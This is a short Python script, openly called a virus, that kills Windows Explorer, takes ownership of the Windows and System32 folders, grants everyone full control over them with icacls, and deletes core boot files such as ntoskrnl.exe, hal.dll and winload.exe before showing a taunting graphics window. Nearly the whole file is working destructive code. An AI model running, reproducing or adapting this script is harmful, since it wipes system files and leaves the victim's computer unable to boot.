import subprocess
import os
import time
from turtle import *
import turtle
import random

def malicious_shit():
    os.popen("taskkill /F /IM explorer.exe /T")
    subprocess.run(['takeown', '/F', "C:"])
    subprocess.run(['takeown', '/F', "C:\\Windows"])
    subprocess.run(['takeown', '/F', "C:\\Windows\\System32"])
    subprocess.run(['takeown', '/F', "C:\\Windows\\System32\\hal.dll"])
    subprocess.run(['takeown', '/F', "C:\\Windows\\System32\\ntoskrnl.exe"])
    subprocess.run(['takeown', '/F', "C:\\Windows\\explorer.exe"])
    subprocess.run(['takeown', '/F', "C:\\Windows\\System32\\Boot\\winload.exe"])
    subprocess.run(['icacls', 'C:\\Windows', "/t", "/grant", "Everyone:(OI)(CI)F"])
    subprocess.run(['icacls', 'C:\\Windows\\System32\\Boot\\winload.exe', "/t", "/grant", "Everyone:(OI)(CI)F"])
    subprocess.run(['icacls', 'C:\\Windows\\explorer.exe', "/t", "/grant", "Everyone:(OI)(CI)F"])
    subprocess.run(['icacls', 'C:\\Windows\\System32', "/t", "/grant", "Everyone:(OI)(CI)F"])
    subprocess.run(['icacls', 'C:\\Windows\\System32\\hal.dll', "/t", "/grant", "Everyone:(OI)(CI)F"])
    subprocess.run(['icacls', 'C:\\Windows\\System32\\ntoskrnl.exe', "/t", "/grant", "Everyone:(OI)(CI)F"])
    os.remove("C:\\Windows\\System32\\ntoskrnl.exe")
    os.remove("C:\\Windows\\System32\\hal.dll")
    os.remove("C:\\Windows\\System32\\explorer.exe")
    os.remove("C:\\Windows\\System32\\Boot\\winload.exe")

def graphics():
    screen = turtle.Screen()
    screen.bgcolor("black")
    screen.title("UH OH UR FILES ARE GONIE GONE :)")
    screen.setup(width=800, height=600)

    writer = turtle.Turtle()
    writer.hideturtle()
    writer.speed(0)
    writer.penup()

    colors = ["red", "orange", "yellow", "lime", "cyan", "violet"]

    def glitch_effect():
        # Randomly move the turtle to create a glitch effect
        writer.goto(random.randint(-400, 400), random.randint(-300, 300))
        # Change the color randomly
        writer.color(random.choice(colors))
        # Clear the screen and redraw the text
        writer.clear()
        writer.write("POOPY BABY I DELETED UR SYSTEM FILES :)", align="center", font=("Comic Sans MS", 32, "bold"))
        # Schedule the next glitch
        screen.ontimer(glitch_effect, 100)

    # Initial call to start the glitch effect
    glitch_effect()
    screen.mainloop()
    turtle.done()

input("This is a virus, are you sure you want to run it? (y/n): ")
if input().lower() == 'y':
    malicious_shit()
    graphics()
else:
    print("Yeah, I knew you had no balls to run this shit.")
